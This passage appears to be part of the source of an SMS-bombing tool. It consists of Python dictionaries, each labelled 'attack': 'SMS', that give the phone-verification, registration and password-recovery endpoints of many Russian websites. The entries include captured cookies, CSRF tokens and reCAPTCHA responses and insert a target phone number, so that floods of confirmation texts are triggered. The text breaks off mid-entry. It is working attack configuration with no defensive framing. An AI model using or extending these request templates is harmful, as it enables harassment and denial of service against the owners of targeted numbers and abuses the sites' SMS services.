            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Remontnik.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://www.remontnik.ru/api/v1/profile/confirm/phone',
            'headers': user_agent()[0],
            'json': {'phone': number},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Fkniga.Ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://fkniga.ru/api/fast/credentials-verification/send/',
            'json': {'value': f'+{number}'},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'HappyKids.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://happykids.ru/bitrix/services/main/ajax.php?mode=class&c=vedita%3Aauth.form&action=sendCode',
            'data': {'type': 'phone', 'value': f'+{number}'},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Olymp-Men.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://www.olymp-men.ru/local/templates/olymp/components/bitrix/system.auth.registration/flat/ajax.php',
            'data': {'ajax_call': 'y', 't': 'rsms', 'q': f'+{number}', 'SITE_ID': 's1'},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Delivery-Club.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://passport.delivery-club.ru/registration-validations/phone-confirm-code-submit',
            'cookies': {'_ym_uid': '1680424173517012433', '_ym_d': '1680424173', '_ym_isad': '1', '_ym_visorc': 'b', 'spravka': 'dD0xNjgwNDI0MjI4O2k9MjEzLjEwOC4xMDUuMTk0O0Q9N0Y2NkQyRTBFRkM5OEZGNzg0RkE3RkNFQzBEOUMyRThBMzUwMzNGOTZGM0RFNTAxMUQ1ODgyOTYxNkZBNEY5NUQ2MEZDOTQzNDc5NDQ2RDM0RURFMDg1QUVDOTdCMzVDO3U9MTY4MDQyNDIyODY4NzcyNTE2OTtoPTIyNzNkNzZmN2FiOTY5Y2Q2NDkzZjg2MDVkOWZmNTJi', 'green_eats': 'true', '_yasc': 'Of+HajM0vluoGskVg4Ki76Yjc2V6F+BYFBpfnHdVpOcxZKYhCR9cgNToNViMlw==', 'yandexuid': '365263071680424436', 'uniqueuid': '860763551680424436', 'theme': 'light',},
            'headers': {'Accept': 'application/json, text/javascript, */*; q=0.01', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Origin': 'https://passport.delivery-club.ru', 'Referer': 'https://passport.delivery-club.ru/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'X-Requested-With': 'XMLHttpRequest', 'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'data': f'csrf_token=c60b12778c9e863d5bc59801e4cd7f115789e0ce%3A1680424436370&track_id=7f066f9b41abceaca7ed23a860a9657d0b&display_language=ru&number={number}&confirm_method=by_sms&isCodeWithFormat=true',
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'lc.rt.ru/classbook', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://lc.rt.ru/backend/api/lk/user',
            'cookies': {'9f4f336f6f7d6675fa0f0e9148c541ed': 'e54c809e50c9c9c3d4e6e7f538bcfc6f', '_ym_uid': '1680414428635556011', '_ym_d': '1680414428', '_ym_visorc': 'w', 'ahoy_visitor': '65d1000f-3a87-4809-920d-d741581d63a9', 'ahoy_visit': 'fd9e8a35-29ae-407f-9866-650fc8d9611d', '_gcl_au': '1.1.723501059.1680414474', '_ga': 'GA1.2.321229556.1680414474', '_gid': 'GA1.2.27058552.1680414474', 'amplitude_id_203a27827b8ff81b5b583aa58b07799brt.ru': 'eyJkZXZpY2VJZCI6IjNhZjRiODc3LTM3OWItNDhjMS04NDU4LTM5MTA0YWQ3N2Y2MVIiLCJ1c2VySWQiOm51bGwsIm9wdE91dCI6ZmFsc2UsInNlc3Npb25JZCI6MTY4MDQxNDQyODI5MiwibGFzdEV2ZW50VGltZSI6MTY4MDQxNDQ4MjQ1NSwiZXZlbnRJZCI6MCwiaWRlbnRpZnlJZCI6MCwic2VxdWVuY2VOdW1iZXIiOjB9', '_ym_isad': '1', '_edtech_session': 'ilpqdDGXPMFtMtw7yAZ%2B4BVjwZjL0NbMWxKzv%2BTEVy222Oj9Gj2SI2SDMqbHyvn6vfaKUrrjBXiSM6C82%2BgPWLgMmGZgaGBohzAOb3x3OvClZgJebdBpqZ3yMOingyZO7LhMHKSSZ1v2cBtodEdtCn5TA%2Fy1ztPeOrUnQ1fQOl4S2UaI--pCQ80OlnWlIXbX4l--guOa5sRCxK7tMkUZGGWlew%3D%3D', 'TS01f13338': '0194c94451e689a06ff2e63144cecf33046261fd2336480be8405577db8fc9939c15a0b18befbe4ae79741456399661c6d2ccd665631f32f80ac1ba8ec84d0f11c4eafcd5f4409a7047ca99ce2a1ef881e07287dd57464ec57d671eb9dbbf4417d40680ed10e5d9bc729c609ae7f075a8df35ee365a1e02fcc455ea208f8399f11226f8196',},
            'headers': {'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'application/json', 'Origin': 'https://lc.rt.ru', 'Referer': 'https://lc.rt.ru/auth', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'json': {'phone': str(number)[1:], 'email': email(), 'first_name': 'User', 'last_name': 'Name', 'password': 'poGSF-kjhfyv2121J', 'password_confirmation': 'poGSF-kjhfyv2121J', 'grade_tag': '7 класс', 'region_id': '77',},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Kotofey.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://kotofey.ru/users/registrate_do/',
            'cookies': {'PHPSESSID': 'aa4131f88b8a66fb13fb66c85c017b78', 'customer-id': 'ca7NwNk3JYM%3D', '_ym_uid': '1680414908486332670', '_ym_d': '1680414908', '_ym_isad': '1', 'isConfirmLocationCity': '1',},
            'headers': {'authority': 'kotofey.ru', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'cache-control': 'max-age=0', 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://kotofey.ru', 'referer': 'https://kotofey.ru/', 'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': user_agent()[1],},
            'data': {'login': number, 'make-password': '1', 'password': '', 'password_confirm': '', 'g-recaptcha-response': '03AKH6MRH3rCBpWWnmYXDyecXPmp2QB39MqUHWqqMsEuKduAFS1QSaWAbdlgGVZzcvaAARGSPY-_r1yx9DnnC5iTWczqr9_wXW_cGzeC1RPDNe5X8R1VIkPxJGlkiM1gQJhBnOMAzvkqfQrymCBOpfjLdy8Zs_J3gwkQ0sNOXmsFtu6aOjWTxWTk13ivRNVPXnuqZoxZ83HmV2o-wX-nhcJxL9eojlNgGq190qNUFCN5KlV6cQXUXYhETwp1t48GCjAXW-6nTlNvcsMoO9ASGn0Uz4rYjNfWF3U08bBattyp9okoXs8kx1IOGTx_TnehvNG5IGFIizci3pQHVPeFp4k9NWH47GVVE5RV8vcfkQM4SXQVbsuKRlXB5BcsBZD-KzgC95kL14yFb8b5IeQppUOFS15sJjla8Fs0qucSQzzspxXFdexv75rWYzlaBs0Zg3hcI2TXjpKjG__xjcjEGLuY-LIfE-cJCZyKJIb2rIYsesslqD6HUI-b4uJ8J1wkrkUK_-jzONYcy1',},
            # Регистрация по смс (если нет акка)
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Kotofey.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://kotofey.ru/udata/users/forget_do/.json',
            'cookies': {'_ym_uid': '1680414908486332670', '_ym_d': '1680414908', '_ym_isad': '1', 'isConfirmLocationCity': '1', 'PHPSESSID': '2ef060c7b0a85d3a5be3b0ee267d49e7', 'customer-id': 'ca7NwNk%2FLYk%3D', 'tmr_lvid': '317b2c46b9cb0b379ec542d16ba91532', 'tmr_lvidTS': '1680419397863', 'tmr_detect': '1%7C1680419397920', '_ga': 'GA1.2.2002085962.1680419398', '_gid': 'GA1.2.563058282.1680419398', '_gat_gtag_UA_33840894_1': '1', '_gcl_au': '1.1.1455161747.1680419398', '_ym_visorc': 'w',},
            'headers': {'authority': 'kotofey.ru', 'accept': 'application/json, text/javascript, */*; q=0.01', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'origin': 'https://kotofey.ru', 'referer': 'https://kotofey.ru/', 'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'x-requested-with': 'XMLHttpRequest',},
            'data': {'forget_login': number,},
            # Восстановление пароля
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'AvtoALL.ru', 'anonymous': 'Yes'},
            'method': 'get',
            'url': f'https://www.avtoall.ru/cart/order/api/phone/?phone={number}&key=ccf10ad8d335ac4da870f12d361c2b57',
            'cookies': {'PHPSESSID3': 'ueq2ms3j7e0kufo1dhhnqdbar0', 'split': 'split-a', 'parthner_code': 'admitad', 'parthner_uid': '995344107d12cbf733014a6c8312c53a', 'lastHost': 'www.avtoall.ru', '_ym_uid': '1680428731532094831', '_ym_d': '1680428731', '_ga': 'GA1.2.237201815.1680428731', '_gid': 'GA1.2.2086788294.1680428731', 'tmr_lvid': 'ef7f8b9cc6c739193a4e2742214887b7', 'tmr_lvidTS': '1680428731459', 'USER_SALE_ID3': '4930646656', '_ym_isad': '1', 'location_data': 'C%3A12%3A%22LocationData%22%3A48%3A%7Ba%3A2%3A%7Bs%3A10%3A%22locationId%22%3Bb%3A0%3Bs%3A9%3A%22confirmed%22%3Bb%3A0%3B%7D%7D', 'out_location_data': 'C%3A15%3A%22OutLocationData%22%3A48%3A%7Ba%3A2%3A%7Bs%3A10%3A%22locationId%22%3Bb%3A0%3Bs%3A9%3A%22confirmed%22%3Bb%3A0%3B%7D%7D', 'amp_3a3558': 'NOZbWEgHSceiF2OLn73j3I...1gt0ln2fm.1gt0lo34v.0.0.0', 'tmr_detect': '1%7C1680428764474',},
            'headers': {'authority': 'www.avtoall.ru', 'accept': 'application/json, text/javascript, */*; q=0.01', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'referer': 'https://www.avtoall.ru/login/', 'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'x-requested-with': 'XMLHttpRequest',},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'PetShop.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://www.petshop.ru/ajax/',
            'cookies': {'route': 'd94b56221c9657ee1357d64f741a0de0', 'PHPSESSID': 'c456347555eaf1f5508ce51dc5edb8b3', 'geo_city_id': 'a%3A1%3A%7Bs%3A7%3A%22city_id%22%3Bi%3A22%3B%7D', 'BITRIX_SM_SALE_UID': '1284006979', '_gid': 'GA1.2.837234741.1680426603', 'tmr_lvid': '71261e04f0a22837ac4ebe64081ae2fc', 'tmr_lvidTS': '1680426603544', 'rrpvid': '99140413621964', 'rcuid': '6429466c276e18e7a81b9055', 'tmr_detect': '1%7C1680426605031', '_ym_uid': '1680426606243088770', '_ym_d': '1680426606', '_userGUID': '0:lfz6m3fw:QiZ7TGxEuC1IxkCWjqtFCLrUxcW5oa7y', 'dSesn': 'fc281a7a-657c-292b-c632-a2010c0626a1', '_dvs': '0:lfz6m3fw:T7gNqYKBTqmGB5Vo28kTfUrnRLEic18y', 'flocktory-uuid': '867b1268-a013-4fe5-a44a-830d965e998e-9', '_ym_isad': '1', '_gat': '1', '_gat_EnhancedEcommerceTracker': '1', '_gcl_au': '1.1.1003047175.1680426795', '_gat_UA-46029315-1': '1', '_dc_gtm_UA-46029315-1': '1', '_ga_C0DDR7MNM6': 'GS1.1.1680426795.1.0.1680426795.60.0.0', 'BITRIX_SM_SALE_UID': '1284006979', 'showEcoSystem': 'true', '_ga': 'GA1.2.153906839.1680426603',},
            'headers': {'authority': 'www.petshop.ru', 'accept': 'application/json, text/plain, */*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/json;charset=UTF-8', 'origin': 'https://www.petshop.ru', 'referer': 'https://www.petshop.ru/?utm_source=epn&utm_medium=cpa&utm_campaign=4345726&utm_content=45rshdgmatnldi3ua9boos6l9as9h66r', 'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Yandex";v="23"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1],},
            'json': {'token': '80d3d0cc561a28c722193eeb6a2d219e', 'is_ajax': True, 'phone': f'+{number}', 'force': False,},
            'params': {'act': 'AuthForm.SendCode',},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Faberlic.com', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://nad-faberlic.ru/api-new/submit',
            'cookies': {'PHPSESSID': 'ebff8b71d3b8f733bb1875324c7cbdda', '_csrf': 'b7e5c71efb4a8c95b914bc75548a431fecc68e244b790974a206cb7fea83e533a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22nX7HVQWWqjAy5hHLo1Ec3dLrCsCTXFLy%22%3B%7D', '_ym_uid': '1685981597253581584', '_ym_d': '1685981597', '_ym_isad': '1', '_gid': 'GA1.2.1253993156.1685981598', '_ym_visorc': 'b', '_gat_UA-154434566-1': '1', '_ga_SJQ8BKGXP0': 'GS1.1.1685981598.1.1.1685982751.0.0.0', '_ga': 'GA1.2.634319184.1685981598',},
            'headers': {'authority': 'nad-faberlic.ru', 'accept': '*/*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'cookie': 'PHPSESSID=ebff8b71d3b8f733bb1875324c7cbdda; _csrf=b7e5c71efb4a8c95b914bc75548a431fecc68e244b790974a206cb7fea83e533a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22nX7HVQWWqjAy5hHLo1Ec3dLrCsCTXFLy%22%3B%7D; _ym_uid=1685981597253581584; _ym_d=1685981597; _ym_isad=1; _gid=GA1.2.1253993156.1685981598; _ym_visorc=b; _gat_UA-154434566-1=1; _ga_SJQ8BKGXP0=GS1.1.1685981598.1.1.1685982751.0.0.0; _ga=GA1.2.634319184.1685981598', 'origin': 'https://nad-faberlic.ru', 'referer': 'https://nad-faberlic.ru/733776567/catalog/mlm/29254?utm_source=yandex%D0%BA%D0%B0%D1%82%D0%B0%D0%BB%D0%BE%D0%B3vsestrani%D0%BC%D1%83%D1%81%D0%BD%D0%B5&utm_medium=cpc&utm_campaign=82689700&utm_content=14051667259&utm_term=---autotargeting&etext=2202.h_6tBBeiD0sayn_WiYwtocjOowm1WeEoYyx0BIgdWDEBqIaWpyEBU2qo802a_Z7MdXFrZG1rZWFyaG9la2Jndw.a201fc5215043a4adaa13c6fa1b8825a77a9b9df&yclid=3095606298469538380', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'x-csrf-token': '5Luqy8489AxyhMdzGvKjO39MVwhKXcPz5OgNSf31PAaK452DmG2jWwPuhgovmut3EH0Sa3k5j4Gnm04dpbNwfw==', 'x-requested-with': 'XMLHttpRequest',},
            'data': f'_csrf=5Luqy8489AxyhMdzGvKjO39MVwhKXcPz5OgNSf31PAaK452DmG2jWwPuhgovmut3EH0Sa3k5j4Gnm04dpbNwfw%3D%3D&action=sms&RegForm%5Buser_id%5D=733776567&RegForm%5Bbranch_id%5D=29254&RegForm%5Bset_id%5D=&RegForm%5Btype%5D=2&RegForm%5Bclient_id%5D=1685981597253581584&RegForm%5Butm_source%5D=yandex%D0%BA%D0%B0%D1%82%D0%B0%D0%BB%D0%BE%D0%B3vsestrani%D0%BC%D1%83%D1%81%D0%BD%D0%B5&RegForm%5Butm_medium%5D=cpc&RegForm%5Butm_content%5D=14051667259&RegForm%5Butm_term%5D=---autotargeting&RegForm%5Bsponsor_id%5D=736636233&RegForm%5Bsex%5D=f&RegForm%5Breturn_url%5D=https%3A%2F%2Ffaberlic.com&RegForm%5Bcountry_id%5D=1&RegForm%5Bsurname%5D=Name&RegForm%5Bname%5D=User&RegForm%5Bpatronymic%5D=Names&RegForm%5Bbirthday%5D=11.11.1991&RegForm%5Bemail%5D={email()}&RegForm%5Bphone%5D={number}&RegForm%5Bcode%5D=',
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Kruiz.Online', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://kruiz.online/api/v1/ApiUsers/get_auth_smscode',
            'cookies': {'admitad_uid': 'f2122fdfdb0110a95ebe4d1cb5f4d650', 'utm_source': 'admitad', '_vis_opt_s': '1%7C', '_vis_opt_test_cookie': '1', 'flocktory-uuid': 'be0f7206-9d63-45fe-a88b-8add011ee154-3', 'ci_session': '7vjb8qbrtgo9be1cuvhoep4b4c0qgb8u', '_vwo_uuid_v2': 'D590414976EB99B6AE6C1A86E20782D7D|7a2bd695833769c343f17c301e64d102', '_ym_uid': '1686427544210065319', '_ym_d': '1686427544', 'cted': 'modId%3Dhe5z7y28%3Bclient_id%3D382693986.1686427524%3Bya_client_id%3D1686427544210065319', 'tmr_lvid': '96ba12a75dad5965802bf09206004f0e', 'tmr_lvidTS': '1686427544475', '_ga': 'GA1.2.382693986.1686427524', '_gid': 'GA1.2.819281563.1686427545', '_ga_cid': '382693986.1686427524', 'roistat_visit': '7046923', 'roistat_first_visit': '7046923', 'roistat_visit_cookie_expire': '1209600', 'roistat_is_need_listen_requests': '0', 'roistat_is_save_data_in_cookie': '1', 'roistat_marker': '%3Autm%3Aadmitad', 'roistat_marker_old': '%3Autm%3Aadmitad', 'tmr_detect': '1%7C1686427545314', '_ym_isad': '1', '_ct_ids': 'he5z7y28%3A52930%3A1839743143', '_ct_session_id': '1839743143', '_ct_site_id': '52930', 'call_s': '%3C!%3E%7B%22he5z7y28%22%3A%5B1686429354%2C1839743143%2C%7B%22264786%22%3A%22794087%22%7D%5D%2C%22d%22%3A2%7D%3C!%3E', '_ct': '800000000760957356', '_ct_client_global_id': '3918d630-a299-5a65-b261-82c7808432bc', 'roistat_call_tracking': '1', 'roistat_phone_replacement': 'null', 'roistat_phone_script_data': '%5B%7B%22phone%22%3A%22%2B7%20499%20681-74-32%22%2C%22css_selectors%22%3A%5B%5D%2C%22replaceable_numbers%22%3A%5B%2274958775834%22%5D%7D%5D', '_ym_visorc': 'w', '___dc': '3539cf56-52b3-4080-a0a9-ff205c8cda19', '_ga_CY4DQRT0T3': 'GS1.1.1686427523.1.0.1686428626.60.0.0', 'roistat_emailtracking_email': 'null', 'roistat_emailtracking_tracking_email': 'null', 'roistat_emailtracking_emails': 'null', 'roistat_cookies_to_resave': 'roistat_marker%2Croistat_marker_old%2Croistat_ab%2Croistat_ab_submit%2Croistat_visit%2Croistat_phone%2Croistat_call_tracking%2Croistat_phone_replacement%2Croistat_phone_script_data%2Croistat_emailtracking_email%2Croistat_emailtracking_tracking_email%2Croistat_emailtracking_emails',},
            'headers': {'authority': 'kruiz.online', 'accept': 'application/json, text/plain, */*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://kruiz.online', 'referer': 'https://kruiz.online/?utm_source=admitad&admitad_uid=f2122fdfdb0110a95ebe4d1cb5f4d650', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1],},
            'data': {'login': number,},
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Mir-Kubikov.ru', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://mir-kubikov.ru/local/components/multisite/system.auth.sms/ajax.php',
            'cookies': {'PHPSESSID': 'Dd894dMzYn6C35WQXbPVKT7KfGH0gTAc', 'BITRIX_SM_SALE_UID': '1297357420', 'rerf': 'AAAAAGSE3bCMfoEWA/o4Ag==', 'ipp_uid': '1686429104044/xfrEShqUNBgNf12I/EISYqwd5NB/h1xJgWbfmxA==', 'ipp_key': 'v1686429104044/v33947245ba5adc7a72e273/ATTNdtZHheyYfsit7XFafQ==', '_ym_uid': '1686429123968194167', '_ym_d': '1686429123', '_gid': 'GA1.2.785385513.1686429124', 'tmr_lvid': 'a0030e943efc3d1f6c8d93d3cbe04b7e', 'tmr_lvidTS': '1686429125831', '_ym_visorc': 'w', 'tmr_detect': '1%7C1686429126323', '_ym_isad': '1', 'adspire_uid': 'AS.1784641855.1686429129', 'atm_closer': '%7B%22id%22%3A348%2C%22mid%22%3A410%2C%22aid%22%3A%22AS.1784641855.1686429129%22%2C%22cookie_time%22%3A1686429129198%2C%22priority%22%3A0%2C%22webid%22%3A%22253174%22%2C%22uid%22%3A%2210ced0288db1a8b66d08011e47aa414e%22%7D', '_ga': 'GA1.2.1594404092.1686429124', 'BX_USER_ID': 'caf340d697eb3845d14eaef07f941d3e', 'popmechanic_sbjs_migrations': 'popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1', '_gpVisits': '{"isFirstVisitDomain":true,"idContainer":"10002548"}', '_gp10002548': '{"utm":"20432a3a","hits":1,"vc":1,"ac":1}', 'mindboxDeviceUUID': 'c761a8c5-1854-4bb0-a7d2-b34801f345be', 'directCrm-session': '%7B%22deviceGuid%22%3A%22c761a8c5-1854-4bb0-a7d2-b34801f345be%22%7D', 'first-visit': 'no', 'user_city': '%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0', '_dc_gtm_UA-27910860-1': '1', '_ga_61W59B3053': 'GS1.1.1686429126.1.1.1686430807.55.0.0',},
            'headers': {'Accept': 'application/json, text/javascript, */*; q=0.01', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Origin': 'https://mir-kubikov.ru', 'Referer': 'https://mir-kubikov.ru/?admitad_uid=10ced0288db1a8b66d08011e47aa414e&utm_campaign=253174&utm_content=closer&utm_medium=cpa&utm_source=admitad', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'X-Requested-With': 'XMLHttpRequest', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'data': f'sessid=e69108423c0698bb8598be5b40676ad6&action=code_sms&PERSONAL_PHONE=+{number}&PERSONAL_EMAIL=',
        },
        {
            'info': {'country': 'RU', 'attack': 'SMS', 'website': 'Cdek.Shopping', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://cdek.shopping/phone-send-code',
            'cookies': {'cart_id': 'eyJpdiI6IjFVQlk2UDhneHZpOUI1WGg4VFlSL1E9PSIsInZhbHVlIjoiaW9iNjNlcFZLc1hDRU53OGhacE5HSjJNQ1pJMndIS3Uwc0dMTTMwdTBJNVFhQU5ZUmQySTFzZ0JIZy9zRlFIZUZmWHJMTGZWQThEZ2IweHEzR0FDNEwrd2ZBRzBSQUEzT0wyUzMxamJsdW89IiwibWFjIjoiZjI4N2RmNmM1OTJjMzg0ZWQxNmIwMDAwNmIyNzk4MDlmYWI4YWRmNjU3Njc0ODhmMzE3YTk1YjhmYTQ4MmFkYyIsInRhZyI6IiJ9', 'wishlist_id': 'eyJpdiI6InJJYTMwZWZCOGlYRjFReGo3R0h5bEE9PSIsInZhbHVlIjoiTW1OTXNGTkNwNFZPTW1oN29pbmZiQWV6K2MxVzJFcFRXRHVnSE1BbEhYMENXYmN6M1k5a1FkbEV0ckpVejNxNitCRVVQTS9uMHdvTlEra0pBcHpKWVJuQndjTnhBdzVIbTlZZngrNnBtanc9IiwibWFjIjoiNDlhZDgwMjU4MGIxODBkZThjNTZhYzMxNTg3NDgzOTBhNGRkNGFhZGEzNTUyMmQ4ZTIyOWY3M2JkYjUwNGJlNCIsInRhZyI6IiJ9', 'deduplication_cookie': 'advcake', 'deduplication_cookie': 'advcake', 'mindboxDeviceUUID': 'ce016f04-8e20-4ede-9c45-c0cc5948cf78', 'directCrm-session': '%7B%22deviceGuid%22%3A%22ce016f04-8e20-4ede-9c45-c0cc5948cf78%22%7D', 'geo_cookie': 'eyJpdiI6IjVWMnM2V1RGcTVua2Z6bnVCNmhBVkE9PSIsInZhbHVlIjoiclZ5blR6Nk42SWc3MWtLY1pwMnFzZHpMbm1JY2cwY0Z0TWFJRWpLNG1VZ25TTHRLazFmQmRTMWxFZ3d3QkI0TmRRNkhHQ3hJZHlmS0hTM0syWFU2ZlFJQUg3ODJqRzd4VDhnMm1VQUlHUG89IiwibWFjIjoiNjc4ZGNmNDkxZTBkMjU0ZWViOGM0NzA2NTU4OTYxMDYyMTM2MTM3MTcyOGIzNWI1YTUzM2UyNWVkNGYwODUzYyIsInRhZyI6IiJ9', 'tt_deduplication_cookie': 'advcake', 'tt_deduplication_cookie': 'advcake', 'advcake_track_id': '1904e6be-3130-cf4f-a5d0-c7dbd5503039', 'advcake_session_id': '5fb1b6f0-afdb-87a7-28fc-b7902f3b9836', 'advcake_track_url': 'https%3A%2F%2Fcdek.shopping%2F%3Futm_source%3Dadvcake%26utm_medium%3Dcpa%26utm_campaign%3Depnbz%26utm_content%3D4345726%26advcake_params%3D42rw20xfseqbtpmcy1va3jx7u72me1f1%26utm_term%3D42rw20xfseqbtpmcy1va3jx7u72me1f1', 'advcake_utm_partner': 'epnbz', 'advcake_utm_webmaster': '4345726', 'advcake_click_id': '42rw20xfseqbtpmcy1va3jx7u72me1f1', '_userGUID': '0:liqga3pe:ubFqBC_ymbM_q_n1hYExpCaLDVaLAWbv', 'popmechanic_sbjs_migrations': 'popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1', '_ym_uid': '1686429015346806707', '_ym_d': '1686429015', '_gaexp': 'GAX1.2.qSSk8UAFQrKpzNM_3yRboA.19594.0!3Z24vfVrRHijrzamsxBHHA.19594.1', 'tmr_lvid': 'e57144f7d31ead4aa72a37429ffe1c1d', 'tmr_lvidTS': '1686429015025', 'tmr_detect': '1%7C1686429015378', '_ym_isad': '1', '_ga': 'GA1.2.304924740.1686429015', '_gid': 'GA1.2.310622002.1686429016', 'request-for-buy-modal-displayed': '1', 'XSRF-TOKEN': 'eyJpdiI6Ik9OU1FBeFdXRXloTm40cEVySWVzUWc9PSIsInZhbHVlIjoia010Z0VUazF1cVFNUElXQlVhQmtOR2F4UHM3dzFNR09VZm5ReFErYnhsMm9FVk1WOUNiWHdBelN5SHN4UC9SSGtYWUtvSyswQkFUcTlVTGhTelhBdWhYRmpPNzNRRTlmUk5ncTNDUHJIQU1mNUswMkMvQ0FxbVhwdzZMdE13QzEiLCJtYWMiOiIzMTU1OTZlNzc3ODIxNmNhNTlkMWYxMDk0NmU4NDhjYjcyNjc3OWJjMTc4OGExMzc0NDk5MDBmNjI4YmRkMjU2IiwidGFnIjoiIn0%3D', 'botble_session': 